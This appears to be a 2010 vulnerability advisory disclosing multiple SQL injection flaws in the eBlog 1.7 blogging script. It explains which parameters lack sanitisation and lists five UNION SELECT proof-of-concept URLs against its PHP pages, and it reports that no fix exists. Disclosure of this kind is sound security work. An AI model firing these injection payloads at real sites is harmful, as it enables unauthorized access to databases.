@@ -1,0 +1,77 @@
+eBlog 1.7 Multiple SQL Injection Vulnerabilities
+
+ Name              eBlog
+ Vendor            https://emuci.com
+ Versions Affected 1.7
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-11-10
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+eBlog  is  a  free  script that can be used to manage and
+maintain personal blogs.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters are not sanitised before being  used  in
+SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple SQL Injection
+ 
+
+A) Multiple SQL Injection
+_________________________
+
+Input passed to "id", "keywords" and  to  some parameters
+sent  via  POST  method, is not properly sanitised before
+being  used  in SQL queries. This  can  be  exploited  to
+manipulate  SQL  queries by injecting arbitrary SQL code.
+
+Successful  exploitation,  only  in some  cases, requires
+that magic_quotes_gpc is set to Off.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple SQL Injection
+
+The following sample code don't need requirements.
+
+http://site/path/topics.php?action=ShowComment&id=-1 UNION SELECT 1,2,3,4,5,6,7%23
+
+The following sample codes require  that magic_quotes_gpc
+is set to Off:
+
+http://site/path/pages.php?id=-1' UNION SELECT 1,2,3,4,1,6,7,1%23
+http://site/path/topics.php?action=show&id=-1' UNION SELECT 1,2,3,4,5,6,7,8%23
+http://site/path/sections.php?action=show&id=-1' UNION SELECT 1,2,3,4,5%23
+http://site/path/search.php?keyword=%25' UNION SELECT 1,2,3,4,5,6,7,8%23
+
+
+V. FIX
+______
+
+No fix.
+
